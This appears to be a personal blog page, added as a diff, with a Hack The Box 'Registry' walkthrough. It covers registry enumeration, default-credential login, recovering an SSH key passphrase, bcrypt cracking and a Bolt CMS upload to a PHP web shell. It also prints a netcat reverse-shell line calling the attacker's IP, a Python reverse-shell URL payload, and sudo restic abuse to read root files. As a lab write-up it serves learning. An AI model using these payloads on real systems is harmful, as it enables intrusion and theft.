@@ -1,0 +1,576 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="/css/post.css">
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/scroll.css">
+  <link rel="stylesheet" href="/css/typewriter.css">
+  <link rel="stylesheet" href="/fontawesome/css/all.min.css">
+  <link rel="shortcut icon" href="/img/jekyll/hack.png"/>
+  <title>My pentest notes</title>
+</head>
+<body>
+
+
+<div class="header">
+  <div>
+    <h3><span class="typewriter">My pentest notes</span></h3>
+  </div>
+</div>
+
+<div class="nav">
+  <ul class="text-source">
+    <li> <a href="/">HOME</a> </li>
+    <li> <a href="\list">POSTS</a> </li>
+    <li> <a href="\form">SEARCH</a> </li>
+  </ul>
+</div>
+
+
+<div class="row">
+  <div class="leftcolumn">
+    <div class="card">
+  <h2 class="text-source">About Me</h2>
+  <ul class="list-none">
+    <li><i class="fas fa-user mb-08"></i> DanP</li>
+    <li><i class="fas fa-map-marker-alt mb-08"></i> Brazil</li>
+    <li><i class="fas fa-envelope mb-08"></i> 
+    	<a class="decoration-none text-white" target="_blank" href="mailto:soaresdaniel487@gmail.com"> E-mail </a> 
+    </li>
+    <li><i class="fab fa-github"></i> <a class="decoration-none text-white" href="https://github.com/D4nPs" target="_blank">Github</a> </li>
+    <li><i class="fab fa-linkedin"></i> <a class="decoration-none text-white" href="https://www.linkedin.com/in/danielspatricio/" target="_blank">Linkedin</a> </li>
+  </ul>
+</div>
+
+    <div class="mt-2">
+    <h4  class="text-white" style="padding-left: 25px">Share this:</h4>
+    <div id="share-bar">
+
+    <!-- <h5>Share this:</h5> -->
+
+    <div class="share-buttons text-center">
+        <a style="text-decoration: none;" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/Registry-hackthebox-walkthrough/"
+            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+            title="Share on Facebook" >
+            <i class="fab fa-facebook share-button"></i>
+        </a>
+
+        <a style="text-decoration: none;" href="https://twitter.com/intent/tweet?text=Hack the box Registry Walkthrough&url=http://localhost:4000/Registry-hackthebox-walkthrough/"
+            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+            title="Share on Twitter" >
+            <i class="fab fa-twitter share-button"></i>
+        </a>
+
+        <a style="text-decoration: none;" href="http://www.reddit.com/submit?url=http://localhost:4000/Registry-hackthebox-walkthrough/"
+            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;"
+            title="Share on Reddit" >
+            <i class="fab fa-reddit-alien share-button"></i>
+        </a>
+
+        <a style="text-decoration: none;" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/Registry-hackthebox-walkthrough/&title=Hack the box Registry Walkthrough&summary=My walkthrough for hack the box - Register&source=My pentest notes"
+            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+            title="Share on LinkedIn" >
+            <i class="fab fa-linkedin share-button"></i>
+        </a>
+
+        <a style="text-decoration: none;" href="mailto:?subject=Hack the box Registry Walkthrough&amp;body=Check out this site http://localhost:4000/Registry-hackthebox-walkthrough/"
+            title="Share via Email" >
+            <i class="fa fa-envelope share-button"></i>
+        </a>
+    </div>
+
+</div>
+    </div>
+  </div>
+
+  <div class="rightcolumn">
+    <div class="card box-content">
+    	
+      <h2 class="text-source text-blue"> Hack the box Registry Walkthrough </h2>
+<h5> My walkthrough for hack the box - Register </h5>
+<h5> Apr, 4 2020 </h5>
+
+
+      <p><small> <i> Tags: HACKTHEBOX | DOCKER | BOLT | CMS | REGISTRY | HARD </i> </small></p>
+
+<h2 id="nmap">Nmap</h2>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap 10.10.10.159 -sV -sC -oA scan/stdscan 
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-03 08:53 EDT
+Nmap scan report for 10.10.10.159
+Host is up (0.11s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
+|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
+|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
+80/tcp  open  http     nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
+|_http-server-header: nginx/1.14.0 (Ubuntu)
+|_http-title: Welcome to nginx!
+| ssl-cert: Subject: commonName=docker.registry.htb
+| Not valid before: 2019-05-06T21:14:35
+|_Not valid after:  2029-05-03T21:14:35
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Running <code class="highlighter-rouge">nmap</code>we can spot three services running</p>
+
+<ul>
+  <li>SSH 22/TCP</li>
+  <li>HTTP 80/TCP</li>
+  <li>HTTPS 443/TCP</li>
+</ul>
+
+<p>There’s a very importante information being leaked at the SSL Certificate, a subdomain <code class="highlighter-rouge">docker.registry.htb</code>.</p>
+
+<p>So let’s update our <code class="highlighter-rouge">/etc/hosts/</code>file</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>danps@pwnbox:~/hackthebox$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	pwnbox
+10.10.10.159    registry.htb docker.registry.htb
+
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+</code></pre></div></div>
+
+<h2 id="registryhtb">registry.htb</h2>
+
+<p>Going into the main website we see just this default nginx page. I used a tool called <code class="highlighter-rouge">rustbuster</code>to find some new directories.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>danps@pwnbox:~/hackthebox$ rustbuster dir -u "http://registry.htb" -w /usr/share/wordlists/dirb/common.txt  --no-banner
+~ rustbuster v3.0.3 ~ by phra &amp; ps1dr3x ~
+
+[?] Started at	: 2020-04-03 09:12:32
+
+GET	200 OK				http://registry.htb/
+GET     403 Forbidden                   http://registry.htb/.bash_history
+GET     403 Forbidden                   http://registry.htb/.hta
+GET     403 Forbidden                   http://registry.htb/.htaccess
+GET     403 Forbidden                   http://registry.htb/.htpasswd
+GET     200 OK                          http://registry.htb/index.html
+GET     301 Moved Permanently           http://registry.htb/install
+						=&gt; http://registry.htb/install/
+  [00:00:51] ########################################    4611/4611    ETA: 00:00:00 req/s: 90
+</code></pre></div></div>
+
+<p><img src="/img/jekyll/8/registry_main_install.png" alt="registry_main_install" class="img-responsive" /></p>
+
+<p><code class="highlighter-rouge">rustbuster</code> found a <code class="highlighter-rouge">/install</code> directory. Browsing there, we find a bunch o gibberish that’s clearly a file, we can download with <code class="highlighter-rouge">curl</code>and save it locally.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://registry.htb/install/ <span class="nt">-s</span> <span class="o">&gt;</span> <span class="nb">install</span>
+</code></pre></div></div>
+
+<p>Extracting the file we just got, we see two files</p>
+
+<ul>
+  <li>Readme.md</li>
+  <li>ca.crt</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>danps@pwnbox:~/hackthebox/registry$ cat readme.md 
+# Private Docker Registry
+
+- https://docs.docker.com/registry/deploying/
+- https://docs.docker.com/engine/security/certificates/
+danps@pwnbox:~/hackthebox/registry$ cat ca.crt 
+-----BEGIN CERTIFICATE-----
+MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV
+BAMMCFJlZ2lzdHJ5MB4XDTE5MDUwNjIxMTQzNVoXDTI5MDUwMzIxMTQzNVowEzER
+MA8GA1UEAwwIUmVnaXN0cnkwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIB
+AQCw9BmNspBdfyc4Mt+teUfAVhepjje0/JE0db9Iqmk1DpjjWfrACum1onvabI/5
+T5ryXgWb9kS8C6gzslFfPhr7tTmpCilaLPAJzHTDhK+HQCMoAhDzKXikE2dSpsJ5
+zZKaJbmtS6f3qLjjJzMPqyMdt/i4kn2rp0ZPd+58pIk8Ez8C8pB1tO7j3+QAe9wc
+r6vx1PYvwOYW7eg7TEfQmmQt/orFs7o6uZ1MrnbEKbZ6+bsPXLDt46EvHmBDdUn1
+zGTzI3Y2UMpO7RXEN06s6tH4ufpaxlppgOnR2hSvwSXrWyVh2DVG1ZZu+lLt4eHI
+qFJvJr5k/xd0N+B+v2HrCOhfAgMBAAGjUzBRMB0GA1UdDgQWBBTpKeRSEzvTkuWX
+8/wn9z3DPYAQ9zAfBgNVHSMEGDAWgBTpKeRSEzvTkuWX8/wn9z3DPYAQ9zAPBgNV
+HRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQABLgN9x0QNM+hgJIHvTEN3
+LAoh4Dm2X5qYe/ZntCKW+ppBrXLmkOm16kjJx6wMIvUNOKqw2H5VsHpTjBSZfnEJ
+UmuPHWhvCFzhGZJjKE+An1V4oAiBeQeEkE4I8nKJsfKJ0iFOzjZObBtY2xGkMz6N
+7JVeEp9vdmuj7/PMkctD62mxkMAwnLiJejtba2+9xFKMOe/asRAjfQeLPsLNMdrr
+CUxTiXEECxFPGnbzHdbtHaHqCirEB7wt+Zhh3wYFVcN83b7n7jzKy34DNkQdIxt9
+QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B
+-----END CERTIFICATE-----
+</code></pre></div></div>
+
+<p>The first one we see some links about <code class="highlighter-rouge">docker registry</code> , and the <code class="highlighter-rouge">ca.crt</code>is a file that allow us to login to this private registry? We still don’t know.</p>
+
+<h2 id="dockerregistryhtb">docker.registry.htb</h2>
+
+<p><img src="/img/jekyll/8/docker_registry.png" alt="docker_registry" class="img-responsive" /></p>
+
+<p>Another blank page, running <code class="highlighter-rouge">rustbuster</code>again.</p>
+
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">danps@pwnbox:~/hackthebox/registry$</span><span class="w"> </span>rustbuster <span class="nb">dir</span> <span class="nt">-u</span> <span class="s2">"http://docker.registry.htb/"</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt  <span class="nt">--no-banner</span>
+<span class="go">~ rustbuster v3.0.3 ~ by phra &amp; ps1dr3x ~
+
+[?] Started at	: 2020-04-03 10:47:24
+
+GET	200 OK				                      http://docker.registry.htb/
+GET     301 Moved Permanently           http://docker.registry.htb/v2
+</span><span class="gp">						=&gt;</span><span class="w"> </span>/v2/
+<span class="gp">  [00:00:51] #</span><span class="c">#######################################    4611/4611    ETA: 00:00:00 req/s: 90</span>
+</code></pre></div></div>
+
+<p>We find a <code class="highlighter-rouge">v2</code>directory.</p>
+
+<p><img src="/img/jekyll/8/registry_v2.png" alt="registry_v2" class="img-responsive" /></p>
+
+<p>It ask us for a <code class="highlighter-rouge">user</code>and <code class="highlighter-rouge">password</code>. I think this part was a bit of guessing but the first thing that I always try is <code class="highlighter-rouge">admin:admin</code> and this time it worked.</p>
+
+<p><img src="/img/jekyll/8/registry_empty.png" alt="registry_empty" class="img-responsive" /></p>
+
+<p>But we only get these empty curly braces.</p>
+
+<h2 id="docker-login">Docker Login</h2>
+
+<p>Knowing that we’re dealing with a <code class="highlighter-rouge">docker registry</code> we can try to login to this and check out its images.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>danps@pwnbox:~/hackthebox/registry$ sudo docker login docker.registry.htb
+Username: admin
+Password: 
+Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority
+</code></pre></div></div>
+
+<p>According to the official docker documentation, we need to add some valid certificates to make it work</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/docker/certs.d/           &lt;-- Certificate directory
+    └── docker.registry.htb    &lt;-- Hostname:port
+       ├── client.cert         &lt;-- Client certificate
+       ├── client.key          &lt;-- Client key
+       └── ca.crt              &lt;-- Certificate authority that signed
+                                    the registry certificate (the one we extracted from            																																		the install zip)
+</code></pre></div></div>
+
+<p>First, we generate our client certificate</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl genrsa <span class="nt">-out</span> client.key 4096
+openssl req <span class="nt">-new</span> <span class="nt">-x509</span> <span class="nt">-text</span> <span class="nt">-key</span> client.key <span class="nt">-out</span> client.cert
+</code></pre></div></div>
+
+<p>Now we create a folder inside <code class="highlighter-rouge">certs.d</code> and move the certificates. In the end it should look like this</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>danps@pwnbox:/etc/docker/certs.d$ tree
+.
+└── docker.registry.htb
+    ├── ca.crt
+    ├── client.cert
+    └── client.key
+
+1 directory, 3 files
+</code></pre></div></div>
+
+<p>If we try to login again, we succeed</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>danps@pwnbox:~/hackthebox/registry/certs$ sudo docker login docker.registry.htb
+Username: admin
+Password: 
+WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
+Configure a credential helper to remove this warning. See
+https://docs.docker.com/engine/reference/commandline/login/#credentials-store
+
+Login Succeeded
+</code></pre></div></div>
+
+<p>To find what images are stored in this register we can browse to <code class="highlighter-rouge">_catalog</code> inside the <code class="highlighter-rouge">/v2</code>dir.</p>
+
+<p><img src="/img/jekyll/8/registry_bolt-image.png" alt="registry_bolt-image" class="img-responsive" /></p>
+
+<p>We discover a <code class="highlighter-rouge">bolt-image</code>, let’s pull and run it locally.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker pull docker.registry.htb/bolt-image
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>danps@pwnbox:~/hackthebox/registry$ sudo docker images
+REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE
+docker.registry.htb/bolt-image   latest              601499e98a60        10 months ago       362MB
+</code></pre></div></div>
+
+<p>Now let’s enumerate it to see if we find any valid credentials.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>docker run <span class="nt">-it</span> docker.registry.htb/bolt-image
+</code></pre></div></div>
+
+<p>Inside the container we can see a <code class="highlighter-rouge">.ssh</code>file inside the <code class="highlighter-rouge">root</code> directory.</p>
+
+<p>Looking at the the <code class="highlighter-rouge">id_rsa.pub</code> file we can see an user <code class="highlighter-rouge">bolt</code>. Another interesting file is <code class="highlighter-rouge">id_rsa</code> which contains the bolt user’s private key, however it is encrypted.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@870d4f2aab64:~/.ssh# cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9
+</code></pre></div></div>
+
+<p>At first I thought I had to brute force this, but it did not work so I went back to enumerate more the machine.</p>
+
+<p>Looking at the <code class="highlighter-rouge">.viminfo</code>file inside the <code class="highlighter-rouge">root</code>directory I noticed some references to <code class="highlighter-rouge">/etc/profile.d/01-ssh.sh</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@870d4f2aab64:~# cat /etc/profile.d/01-ssh.sh 
+#!/usr/bin/expect -f
+#eval `ssh-agent -s`
+spawn ssh-add /root/.ssh/id_rsa
+expect "Enter passphrase for /root/.ssh/id_rsa:"
+send "GkOcz221Ftb3ugog\n";
+expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
+interact
+</code></pre></div></div>
+
+<p>It turned out to be a script to add and put the password to the <code class="highlighter-rouge">id_rsa</code></p>
+
+<p>Credentials</p>
+
+<ul>
+  <li>bolt</li>
+  <li>id_rsa
+    <ul>
+      <li>GkOcz221Ftb3ugog</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Let’s login.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>danps@pwnbox:~/hackthebox/registry$ ssh -i id_rsa bolt@registry.htb
+Enter passphrase for key 'id_rsa': 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
+
+  System information as of Fri Apr  3 15:54:38 UTC 2020
+
+  System load:  0.0               Users logged in:                0
+  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159
+  Memory usage: 23%               IP address for br-1bad9bd75d17: 172.18.0.1
+  Swap usage:   0%                IP address for docker0:         172.17.0.1
+  Processes:    154
+Last login: Fri Apr  3 15:53:46 2020 from 10.10.14.38
+bolt@bolt:~$ 
+</code></pre></div></div>
+
+<p>Now that we’re inside, let’s fetch our <code class="highlighter-rouge">user.txt</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+ytc0ytdmnz&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>I always like to initiate this part running some default enumeration scripts to get some general idea of what I have to do. In this case I discovered that <code class="highlighter-rouge">bolt</code>is actually a content management system (CMS). There are a few interesting files that we have to analyze to figure out our attack plan.</p>
+
+<p>Browsing the <code class="highlighter-rouge">/var/www/html</code>folder, we see an interesting file called <code class="highlighter-rouge">backup.php</code> which has the following script</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
+  <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt"</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>When I saw this, I realized that the user <code class="highlighter-rouge">www-data</code>can run <code class="highlighter-rouge">restic</code>as root without a password. So the current attack plan is:</p>
+
+<ol>
+  <li>Exploit the bolt website to get a shell as <code class="highlighter-rouge">www-data</code></li>
+  <li>Confirm the theory about <code class="highlighter-rouge">restic</code></li>
+  <li>Exploit <code class="highlighter-rouge">restic</code>to read the root.txt file</li>
+</ol>
+
+<h2 id="exploiting-bolt-cms">Exploiting Bolt CMS</h2>
+
+<p>Googling a bit about bolt RCEs, I found this great <a href="https://fgsec.net/from-csrf-to-rce-bolt-cms/">article</a> that says that basically an authanticated user can write to a <code class="highlighter-rouge">config.yml</code>and change the file extensions that the application allows us to upload.But before we get there we need some admin credentials to login.</p>
+
+<p>Searching the web files and configs, we find a <code class="highlighter-rouge">/var/www/html/bolt/app/database/bolt.db</code>which is very likely to have our credential stored.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>strings /var/www/html/bolt/app/database/bolt.db
+</code></pre></div></div>
+
+<p>we find</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>admin $2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK
+</code></pre></div></div>
+
+<p>Which looks like a username and a hashed password. Running it in <code class="highlighter-rouge">John the ripper</code>It says it is a bcrypt hash and using <code class="highlighter-rouge">rockyou.txt</code> for a dictionary attack we find the password <code class="highlighter-rouge">strawberry</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john hash -w /usr/share/wordlists/rockyou.txt --format=bcrypt
+</code></pre></div></div>
+
+<p><strong>Credentials</strong>:</p>
+
+<ul>
+  <li>admin</li>
+  <li>strawberry</li>
+</ul>
+
+<p>And we login</p>
+
+<p><img src="/img/jekyll/8/registry_bolt_login.png" alt="registry_bolt_login" class="img-responsive" /></p>
+
+<p>Now we just replay the steps desribed in the article I mentioned. First we need to change the <code class="highlighter-rouge">accepted_file_types</code>in the config.yml file.</p>
+
+<p><img src="/img/jekyll/8/registry_edit.png" alt="registry_edit" class="img-responsive" /></p>
+
+<p>We just add <code class="highlighter-rouge">php</code> to this list and now we can upload php files.</p>
+
+<p>One thing that is important to point out is that this particular box is not allowing us to make outbounds connections, which means that if I create a file to get a reverse shell, it would be something like this:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>  
+<span class="nb">system</span><span class="p">(</span><span class="s2">"nc 10.10.14.38 9091 -e /bin/bash"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>But since there’s this protection this would just fail. I struggled a bit to realize that I didn’t actually had to leave the box. Since I had a decent SSH Shell, I could just start a netcat listener on the box and connect to it using localhost.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>  
+<span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://registry.htb/bolt/files/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22localhost%22,9091));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27
+</code></pre></div></div>
+
+<p>Let’s upload a file here</p>
+
+<p><img src="/img/jekyll/8/registry_upload.png" alt="registry_upload" class="img-responsive" /></p>
+
+<p>We fire up our netcat on the registry machine on port 9091 and get our new shell!</p>
+
+<p>Ok, we are <code class="highlighter-rouge">www-data</code>now</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bolt:~/html/bolt/files$ whoami
+whoami
+www-data
+www-data@bolt:~/html/bolt/files$ 
+</code></pre></div></div>
+
+<p>To confirm out theory about <code class="highlighter-rouge">www-data</code> and <code class="highlighter-rouge">restic</code>we run <code class="highlighter-rouge">sudo -l</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bolt:~/html/bolt/files$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on bolt:
+    env_reset, exempt_group=sudo, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on bolt:
+    (root) NOPASSWD: /usr/bin/restic backup -r rest*
+</code></pre></div></div>
+
+<p>We can now be sure that www-data can run <strong>/usr/bin/restic backup -r rest</strong> as root without a password.</p>
+
+<h2 id="backup-and-dump-roottxt-file">Backup and dump root.txt file</h2>
+
+<p>Now is the the part where I had to do a ton of research to understand this program. First I read the <a href="https://restic.readthedocs.io/en/latest/">documentation</a> for restic.</p>
+
+<pre><code class="language-l">Restic is a fast and secure backup program. 
+</code></pre>
+
+<p>That’s what the introduction tells us. Reading through the docs, I noticed two important thing:</p>
+
+<ul>
+  <li>We can user a rest server as a repository</li>
+  <li>We can dump the files that we backed up to standard output (stdout)</li>
+</ul>
+
+<p>Which gave me the idea that I had an arbitrary read on the server</p>
+
+<p>I found this <a href="https://github.com/restic/rest-server">Github</a> that has the binaries for running a rest server locally (Remember we can’t make outbounds connections). I transferred the file using over <code class="highlighter-rouge">ssh</code> and started a server locally on the port 8000</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:/dev/shm/server$ ../rest-server --path ${PWD}
+Data directory: /dev/shm/server
+Authentication disabled
+Private repositories disabled
+Starting server on :8000
+</code></pre></div></div>
+
+<p>We need to create a repository on this server to stored the backup data.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:/dev/shm/server$ restic init --repo rest:http://localhost:8000/
+enter password for new repository: 
+enter password again: 
+created restic repository 417ad86527 at rest:http://localhost:8000/
+</code></pre></div></div>
+
+<p>Now that our repository is set, let’s send the root.txt file</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bolt:/dev/shm/ sudo /usr/bin/restic backup -r rest:http://localhost:8000/ -p pass_file /root/root.txt
+</code></pre></div></div>
+
+<p><strong>We need to pass the -p argument because we’re not in a full tty shell, so if the program asks for an input (stdin) we would just lose our shell. The pass_file contains the password we set when we created the repository</strong></p>
+
+<p>Now that our flag is in our repository we just need to dump it</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:/dev/shm$ restic -r rest:http://localhost:8000/ snapshots
+enter password for repository: 
+password is correct
+ID        Date                 Host        Tags        Directory
+----------------------------------------------------------------------
+e8ce5ed2  2020-04-04 04:53:01  bolt                    /root/root.txt
+----------------------------------------------------------------------
+1 snapshots
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bolt@bolt:/dev/shm$ restic dump -r rest:http://localhost:8000/ e8ce5ed2 root.txt
+enter password for repository: 
+password is correct
+ntrkzgnkota&lt;redacted&gt;
+</code></pre></div></div>
+
+<p>Hope you enjoyed it  :-)</p>
+
+<p>by me</p>
+
+
+      <div style="margin-top: 50px">
+      <div id="share-bar">
+
+    <!-- <h5>Share this:</h5> -->
+
+    <div class="share-buttons text-center">
+        <a style="text-decoration: none;" href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/Registry-hackthebox-walkthrough/"
+            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+            title="Share on Facebook" >
+            <i class="fab fa-facebook share-button"></i>
+        </a>
+
+        <a style="text-decoration: none;" href="https://twitter.com/intent/tweet?text=Hack the box Registry Walkthrough&url=http://localhost:4000/Registry-hackthebox-walkthrough/"
+            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+            title="Share on Twitter" >
+            <i class="fab fa-twitter share-button"></i>
+        </a>
+
+        <a style="text-decoration: none;" href="http://www.reddit.com/submit?url=http://localhost:4000/Registry-hackthebox-walkthrough/"
+            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=900,height=500,toolbar=1,resizable=0'); return false;"
+            title="Share on Reddit" >
+            <i class="fab fa-reddit-alien share-button"></i>
+        </a>
+
+        <a style="text-decoration: none;" href="https://www.linkedin.com/shareArticle?mini=true&url=http://localhost:4000/Registry-hackthebox-walkthrough/&title=Hack the box Registry Walkthrough&summary=My walkthrough for hack the box - Register&source=My pentest notes"
+            onclick="window.open(this.href, 'pop-up', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;"
+            title="Share on LinkedIn" >
+            <i class="fab fa-linkedin share-button"></i>
+        </a>
+
+        <a style="text-decoration: none;" href="mailto:?subject=Hack the box Registry Walkthrough&amp;body=Check out this site http://localhost:4000/Registry-hackthebox-walkthrough/"
+            title="Share via Email" >
+            <i class="fa fa-envelope share-button"></i>
+        </a>
+    </div>
+
+</div>
+      </div>
+      
+    </div>
+  </div>
+
+</div>
+
+<div class="footer">
+  <h5>© Copyright 2020 - All Rights Reserved - DanP</h5>
+</div>
+
+
+</body>
+</html>
